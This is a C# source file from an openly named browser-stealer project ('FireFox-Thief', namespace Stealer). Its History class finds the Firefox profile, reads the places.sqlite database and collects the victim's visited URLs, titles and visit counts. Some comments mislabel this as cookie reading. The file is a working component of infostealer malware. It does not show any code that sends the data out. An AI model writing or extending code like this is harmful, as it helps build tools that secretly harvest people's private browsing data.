/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/FireFox-Thief
*/

using System;
using System.IO;
using System.Collections.Generic;
using Stealer.Helpers;
using static Stealer.Helpers.Common;

namespace Stealer.Reader
{
    internal sealed class History
    {        
        // Get cookies from gecko browser
        public static List<Site> Get(string BrowserDir)
        {
            List<Site> scHistory = new List<Site>();
            // Get firefox default profile directory
            string profile = Profile.GetProfile(BrowserDir);
            // Read cookies from file
            if (profile == null) return scHistory;
            string db_location = Path.Combine(profile, "places.sqlite");
            // Read data from table
            SQLite sSQLite = SQLite.ReadTable(db_location, "moz_places");
            if (sSQLite == null) return scHistory;
            // Get values from table
            for (int i = 0; i < sSQLite.GetRowCount(); i++)
            {
                Site sSite = new Site();
                sSite.sUrl = Decryptor.GetUTF8(sSQLite.GetValue(i, 1));
                sSite.sTitle = Decryptor.GetUTF8(sSQLite.GetValue(i, 2));
                sSite.iCount = Convert.ToInt32(sSQLite.GetValue(i, 4)) + 1;

                if (sSite.sTitle != "0")
                {
                    scHistory.Add(sSite);
                }
            }

            return scHistory;
        }
    }
}
